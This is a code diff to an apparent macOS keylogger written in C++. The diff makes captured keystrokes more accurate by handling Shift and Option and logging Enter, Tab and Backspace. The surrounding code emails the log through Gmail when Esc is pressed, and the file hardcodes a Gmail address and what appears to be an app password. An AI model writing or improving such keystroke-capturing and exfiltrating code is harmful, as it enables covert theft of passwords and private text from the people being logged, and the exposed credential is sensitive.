@@ -15,7 +15,7 @@ const char* email_user = "dennis.pidduck@gmail.com"; // Replace with your Gmail 
 const char* email_password = "xglvswysuejigfhq"; // Replace with your Gmail password (use App password if 2FA is enabled)
 const char* recipient_email = "dennis.pidduck@gmail.com"; // Email address where you want to receive the log
 
-std::string convertKeyCodeToString(CGKeyCode keycode) {
+std::string convertKeyCodeToString(CGKeyCode keycode, CGEventRef event) {
     TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
     CFDataRef layoutData = (CFDataRef)TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
     const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);
@@ -28,11 +28,22 @@ std::string convertKeyCodeToString(CGKeyCode keycode) {
     UniChar chars[4];
     UniCharCount realLength;
 
+    // Get the current modifier flags (shift, option, etc.)
+    CGEventFlags modifiers = CGEventGetFlags(event);
+    UInt32 modifierKeyState = 0;
+
+    if (modifiers & kCGEventFlagMaskShift) {
+        modifierKeyState |= shiftKey;
+    }
+    if (modifiers & kCGEventFlagMaskAlternate) {
+        modifierKeyState |= optionKey;
+    }
+
     OSStatus status = UCKeyTranslate(
         keyboardLayout,
         keycode,
-        kUCKeyActionDown,  // Get the character for a key down event
-        0,                 // No modifiers (e.g., shift, control, etc.)
+        kUCKeyActionDown,
+        modifierKeyState,  // Pass modifier state here
         LMGetKbdType(),
         kUCKeyTranslateNoDeadKeysBit,
         &keysDown,
@@ -68,13 +79,9 @@ size_t read_callback(void *ptr, size_t size, size_t nmemb, void *userp) {
 
 // Function to log the key to a file
 void logKey(const std::string& key) {
-    std::ofstream file(logFile, std::ios::app);  // Open file in append mode
+    std::ofstream file(logFile, std::ios::app);  // Open the log file in append mode
     if (file.is_open()) {
-        time_t now = time(0);  // Get current time
-        char* dt = ctime(&now);
-
-        // Write timestamp and key
-        file << "[" << dt << "] " << key << std::endl;
+        file << key;  // Write the key to the log file (no timestamp or newline)
         file.close();  // Ensure the file is closed
     } else {
         std::cerr << "Unable to open log file." << std::endl;
@@ -151,19 +158,29 @@ CGEventRef keyCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event
     if (type == kCGEventKeyDown) {
         CGKeyCode keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
-        std::string keyString = convertKeyCodeToString(keycode);  // Convert keycode to character
-        logKey(keyString);
-
-        // Handle special keys (Esc, Enter, etc.)
+        // Convert keycode to the corresponding character, passing the event for modifiers
+        std::string keyString = convertKeyCodeToString(keycode, event);  
+        
+        // Handle special keys
         switch (keycode) {
+            case 0x24:  // Enter key
+                keyString = "\n";  // Log newline for Enter key
+                break;
+            case 0x33:  // Backspace key
+                keyString = "[BACKSPACE]";
+                break;
+            case 0x30:  // Tab key
+                keyString = "\t";  // Log a tab character for the Tab key
+                break;
             case 0x35:  // Esc key
                 sendEmail();
                 shouldExit = true;
                 break;
             default:
-                // log other characters
                 break;
         }
+
+        logKey(keyString);  // Log the key
     }
     return event;
 }
